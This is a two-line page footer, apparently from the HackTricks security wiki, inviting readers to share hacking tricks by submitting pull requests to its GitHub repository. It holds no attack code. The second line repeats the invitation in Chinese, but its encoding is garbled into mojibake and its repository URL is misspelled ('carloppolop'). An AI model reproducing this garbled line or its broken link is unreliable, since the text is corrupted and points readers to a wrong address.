* **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

***é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>
